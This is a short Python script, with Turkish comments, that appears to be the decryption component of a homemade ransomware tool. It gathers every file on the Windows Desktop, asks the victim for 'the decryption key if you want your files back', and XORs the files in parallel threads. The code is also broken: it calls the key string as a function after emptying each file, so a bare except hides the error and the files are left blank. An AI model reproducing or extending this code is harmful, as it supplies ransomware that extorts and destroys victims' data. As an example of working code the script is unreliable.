import os
import threading
import queue


def decrypt(key):
    while True:
        file = q.get()
        print("Decryption {}".format(file))
        try:
            key_index = 0
            max_key_index = len(key)-1
            encrypted_data = ""
            with open(file,"rb") as f:
                data = f.read()
            with open(file,"w") as f:
                f.write("")
            for byte in data:
                xor_byte = byte ^ ord(key(key_index))
                with open(file, "ab") as f:
                    f.write(xor_byte.to_bytes(1,"little"))

                if key_index>=max_key_index:
                    key_index=0
                else:
                    key_index+=1
            print("{} succesfuly decrypted!!!".format(file))
        except:
            print("failed to decrypted file")
        q.task_done()


# şifreleme bilgileri
ENCRYPTION_LEVEL = 512 // 8  #64 bytes
key_char_pool = "qwertyuopğasdfghjklizxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM<>!'?.,/;[]{}|"
key_char_pool_len = len(key_char_pool)


# filepathleri şifre çözmek için buluyoruz
print("Preparing files...")
desktop_path = os.environ["USERPROFILE"]+"\\Desktop"
files = os.listdir(desktop_path)
abs_files = []
for f in files:
    if os.path.isfile("{}\\{}".format(desktop_path, f)) and f != __file__[:-2]+'exe':
        abs_files.append("{}\\{}".format(desktop_path, f))
print("succesfully located all files!")



key = input("Please enter the decryption key if you want your files back")

#thread oluşturmamız için queue oluşturma
q=queue.Queue()
for f in abs_files:
    q.put(f)

for i in range(10):
    t = threading.Thread(target=decrypt,args=(key,),daemon=True)
    t.start()

q.join()
print("Decryption is complated!!!")
input()
